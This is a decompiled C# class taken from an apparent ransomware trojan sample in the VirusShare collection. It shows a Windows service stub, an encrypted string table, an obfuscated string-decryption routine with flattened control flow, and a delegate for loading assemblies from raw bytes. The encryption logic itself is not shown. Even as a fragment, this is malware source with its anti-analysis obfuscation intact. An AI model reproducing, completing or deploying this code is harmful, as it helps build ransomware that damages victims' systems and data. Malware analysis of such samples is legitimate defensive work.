// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႭႭ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;

namespace Ⴃ
{
  internal sealed class ႭႭ : ServiceBase
  {
    private ႤႳ.Ⴄ Ⴅ = new ႤႳ.Ⴄ();
    private static readonly object Ⴓ;
    private static readonly object Ⴍ = (object) new char[449]
    {
      '欝',
      '欕',
      '欝',
      '煙',
      '帋',
      '䮁',
      '擰',
      '憘',
      '絩',
      '泛',
      '儊',
      'ᙬ',
      'ᙤ',
      '᙭',
      ']',
      'ᆪ',
      'ⱋ',
      '\u0C79',
      '⍩',
      '㛡',
      'ᦍ',
      '\u1CCC',
      '蓛',
      '蓉',
      '蓙',
      '麔',
      '놟',
      'ꐑ',
      '譩',
      '踜',
      '鋪',
      '荁',
      '뺨',
      '麕',
      '놜',
      'ꐐ',
      '譨',
      '踝',
      '鋫',
      '荏',
      '뺫',
      '麓',
      '뇊',
      '㰆',
      '㰏',
      '㰅',
      '㛁',
      '⨵',
      '㯀',
      'ء',
      '☓',
      'ः',
      '\u1C8B',
      '㏧',
      '㚦',
      '\uF2B0',
      '\uF2B9',
      '\uF2B4',
      '\uE8FF',
      '쟶',
      '툪',
      'ﵗ',
      '\uF82A',
      '\uE4C0',
      '\uF561',
      '좑',
      '\uE89F',
      '䑒',
      '䑛',
      '䑗',
      '亓',
      '剡',
      '䎔',
      '繵',
      '幇',
      '煗',
      '擟',
      '䮳',
      '仲',
      '\uEF37',
      '\uEF3E',
      '\uEF31',
      '\uF57A',
      '\uDA71',
      '쾭',
      '\uE0D0',
      '\uE5AD',
      '磊',
      '\uE8E6',
      '픖',
      '\uF518',
      '袧',
      '袯',
      '袠',
      '麔',
      '轡',
      '늀',
      '銲',
      '붢',
      '꠪',
      '蝆',
      '與',
      '\uE52E',
      '\uE527',
      '\uE526',
      '큤',
      '엥',
      '\uEACF',
      '\uEFBE',
      '\uF341',
      '\uE2FB',
      '\uDF18',
      'Ｗ',
      '퀎',
      '속',
      '솄',
      '솄',
      'ힽ',
      '옚',
      'ﮬ',
      '\uDB92',
      '\uF497',
      '\uE104',
      '칻',
      '쬛',
      'ퟘ',
      '극',
      '귰',
      '귳',
      '颿',
      '贲',
      'ꈘ',
      'ꝩ',
      '뮖',
      'ꨬ',
      '韏',
      '럠',
      '飙',
      '쾬',
      '쾥',
      '쾧',
      '\uD998',
      '젻',
      '\uF58D',
      '햳',
      '襁',
      '\uEF25',
      '쁚',
      '씺',
      '\uD9F9',
      '讋',
      '讃',
      '讇',
      'ꭀ',
      '葪',
      '脛',
      '鷤',
      '豞',
      '놽',
      '醒',
      '뺫',
      '蛧',
      '蛮',
      '蛪',
      '腽',
      '벐',
      '鳾',
      '돷',
      '꙱',
      '褕',
      '豦',
      '還',
      '脗',
      '뚭',
      '뚤',
      '뚣',
      '陥',
      '뤚',
      '밻',
      'ꃈ',
      '녧',
      '貟',
      '겣',
      '莻',
      '阁',
      '确',
      '硧',
      '硡',
      '翻',
      '䈙',
      '扷',
      '䵾',
      '壸',
      '瞜',
      '狯',
      '渍',
      '羞',
      '\uDABC',
      '\uDAB5',
      '\uDAAC',
      '勇',
      '픋',
      '퀪',
      '쳙',
      '\uDD76',
      '\uE08E',
      '삲',
      '\uEFAA',
      '塚',
      '\uE97C',
      '\uE975',
      '\uE96D',
      '\uEEEB',
      '팋',
      '\uF365',
      '\uDC6C',
      '짪',
      '\uE68E',
      '\uE3FD',
      '？',
      '\uEE8C',
      '㚟',
      '㚕',
      '㚍',
      'Ϛ',
      'ᘃ',
      '㤯',
      '㱚',
      '₠',
      'ㄊ',
      'ಿ',
      'ⳕ',
      'Ϛ',
      'ᘁ',
      'ⱽ',
      'ⱴ',
      'Ɱ',
      '㩉',
      '⯭',
      'ᙜ',
      '㙢',
      'ᥧ',
      '\u0CF4',
      '⎋',
      '⛫',
      '㨨',
      '⬽',
      '⬴',
      '⬩',
      'ṿ',
      '\u0BF1',
      'ⓜ',
      '↭',
      '㵒',
      '⳨',
      'ᄋ',
      'ㄤ',
      'ḝ',
      '\uDA27',
      '\uDA2E',
      '\uDA32',
      '찑',
      '\uDDB7',
      '\uE006',
      '쀸',
      '\uEF3D',
      '类',
      '헑',
      '킱',
      '챲',
      '퀻',
      '퀳',
      '퀭',
      '\uF0F7',
      '\uDFDA',
      '\uDAAB',
      '왔',
      'ퟮ',
      '\uEA0D',
      '쨢',
      '\uE51B',
      '䣋',
      '䣂',
      '䣜',
      '佑',
      '犽',
      '勒',
      '緛',
      '桝',
      '䜹',
      '䉊',
      '庨',
      '伻',
      '愣',
      '愪',
      '愻',
      '䇤',
      '溕',
      '段',
      '睆',
      '曩',
      '嬑',
      '笭',
      '吵',
      '䆏',
      'ﯻ',
      'ﯲ',
      'ﯢ',
      'ﱯ',
      '속',
      '\uE1E2',
      '컫',
      '\uDB6D',
      '\uF409',
      '\uF17A',
      '\uED98',
      'ﰋ',
      '昗',
      '昞',
      '昍',
      '䛞',
      '榡',
      '沁',
      '灲',
      '懝',
      '尥',
      '簙',
      '匁',
      '䚻',
      '轌',
      '轅',
      '轗',
      '裛',
      '딺',
      '镕',
      '멜',
      '꿚',
      '肾',
      '藍',
      '餯',
      '袼',
      '朞',
      '朗',
      '朂',
      '䟒',
      '梨',
      '消',
      '煻',
      '惔',
      '崬',
      '紐',
      '刈',
      '䞲',
      '句',
      '召',
      '司',
      '呶',
      '榓',
      '䧼',
      '曵',
      '獳',
      '尗',
      '奤',
      '䖆',
      '吕',
      '鍗',
      '鍞',
      '鍉',
      '뎑',
      '鳢',
      '駁',
      '蔲',
      '钝',
      'ꥥ',
      '襙',
      'ꙁ',
      '돻',
      '뼵',
      '뼼',
      '뼪',
      '뢮',
      '蕀',
      'ꔬ',
      '訥',
      '龣',
      '냇',
      '떴',
      '\uA956',
      '룅',
      'ᦢ',
      'ᦫ',
      'ᦂ',
      '㥪',
      'ᘗ',
      'ጴ',
      '࿇',
      'Ṩ',
      '⎐',
      'ά',
      'Ⲵ',
      '㤎',
      '錩',
      '錠',
      '錈',
      '钺',
      '\uA95C',
      '褰',
      '\uA639',
      '뎿',
      '鳛',
      '馨',
      '蕊',
      '铙',
      '戦',
      '戯',
      '戄',
      '䋯',
      '涓',
      '械',
      '瑃',
      '旬',
      '堔',
      '砨',
      '地',
      '䊊',
      '髯',
      '髦',
      '髌',
      '鵾',
      'ꂚ',
      '胶',
      '꿿',
      '멹',
      '锝',
      '遮',
      '貌',
      '鴟',
      '嚝',
      '嚔',
      '嚹',
      '癖',
      '夨',
      '尋',
      '䃸',
      '兗',
      '沯',
      '䲓',
      '掋',
      '瘱'
    };
    private static readonly Array Ⴃ;
    internal static ႭႭ.Ⴅ Ⴀ;

    public ႭႭ() => this.Ⴗ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    protected override void Dispose([In] bool obj0)
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      int num = 5;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
          case 4:
            goto label_5;
          case 2:
            num = this.Ⴅ.Ⴄ == null ? 1 : 3;
            continue;
          case 3:
            goto label_4;
          default:
            num = !obj0 ? 1 : (int) ⴗ[54] - 25736;
            continue;
        }
      }
label_4:
      this.Ⴅ.Ⴄ.Dispose();
label_5:
      base.Dispose(obj0);
      ႷႼ.Ⴗ[33] = (char) ((int) ႷႼ.Ⴗ[33] & (int) ႷႼ.Ⴗ[133] & 237);
    }

    private void Ⴗ()
    {
      this.Ⴅ.Ⴄ = (IContainer) new Container();
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႷႳ.Ⴅ((string) null, 1114476793, 8, (byte) 0), (short) 580, 'Ȭ');
    }

    static ႭႭ()
    {
      char[] chArray = new char[8]
      {
        char.MinValue,
        char.MinValue,
        '\u20FF',
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue
      };
      chArray[1] = '྄';
      chArray[0] = '\u0AF3';
      chArray[5] = '㩄';
      chArray[4] = '᩼';
      chArray[6] = 'ޣ';
      chArray[3] = '㕳';
      chArray[7] = 'ᘆ';
      ႭႭ.Ⴃ = (Array) new string[37];
      ႭႭ.Ⴓ = (object) chArray;
      ႳႣ.Ⴅ();
    }

    internal static string Ⴈ([In] Type obj0, [In] long obj1, [In] int obj2, [In] int obj3)
    {
      byte[] ⴍ1 = ႣႣ.Ⴍ;
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴐ = ႷႨ.Ⴐ;
label_3:
      int index1 = obj3 ^ 1951761635 ^ obj2;
      object ⴍ2 = ႭႭ.Ⴍ;
      char[] chArray1 = (char[]) ⴍ2;
      int num1 = (int) chArray1[index1];
      int index2 = (int) chArray1[index1 + 2] ^ num1;
      int num2 = 11;
      IComparable comparable;
      int index3;
      Array array1;
      Array array2;
      object obj;
      char ch;
      int num3;
      int num4;
      int length;
      int num5;
      while (true)
      {
        switch (num2)
        {
          case 0:
            index3 += 3;
            num4 = num3 & 31 | (num3 & 65472) >> 1;
            goto case 1;
          case 1:
            num2 = (int) ⴍ1[49];
            continue;
          case 2:
            goto label_17;
          case 3:
          case 8:
            num2 = (num3 & 32) == 0 ? (int) ⴐ[109] : (int) ⴍ1[134];
            continue;
          case 4:
            length = ((char[]) array1).Length;
            num5 = 1;
            num2 = 13;
            continue;
          case 5:
            comparable = (IComparable) ((StringBuilder) obj).ToString();
            ((string[]) ႭႭ.Ⴃ)[index2] = comparable as string;
            num2 = 2;
            continue;
          case 6:
            goto label_3;
          case 7:
            goto label_5;
          case 9:
          case 17:
            ++num5;
            num2 = (int) ⴗ[72] - 3739;
            continue;
          case 11:
            num2 = (string) (comparable = (IComparable) ((string[]) ႭႭ.Ⴃ)[index2]) == null ? (int) ⴗ[50] - 33477 : 7;
            continue;
          case 12:
            obj = (object) new StringBuilder();
            ch = (array2 as char[])[index3];
            num3 = (int) ((char[]) array2)[index3 + 1] ^ (int) ch;
            num2 = 0;
            continue;
          case 13:
            num2 = num5 <= num4 ? 14 : (int) ⴐ[528] - 51;
            continue;
          case 14:
            ((StringBuilder) obj).Append((char) ((uint) ch ^ (uint) (array2 as char[])[index3 + num4 - num5] ^ (uint) (array1 as char[])[(num5 + index3 + 17) % length]));
            num2 = (int) ⴐ[450];
            continue;
          case 15:
            char[] chArray2 = (char[]) ⴍ2;
            char[] ⴓ = (char[]) ႭႭ.Ⴓ;
            index3 = index1;
            array1 = (Array) ⴓ;
            array2 = (Array) chArray2;
            num2 = (int) ⴐ[338] - 239;
            continue;
          case 16:
            num4 = num4 << 15 | (int) ((char[]) array2)[index3++] ^ (int) ch;
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႭႭ.Ⴈ);
            num2 = (int) ⴍ1[175] - 176;
            continue;
        }
      }
label_5:
      return comparable as string;
label_17:
      return (string) comparable;
    }

    internal delegate Assembly ႣႤ([In] byte[] obj0);

    [StructLayout(LayoutKind.Explicit, Size = 898, Pack = 1)]
    private struct Ⴅ
    {
    }
  }
}
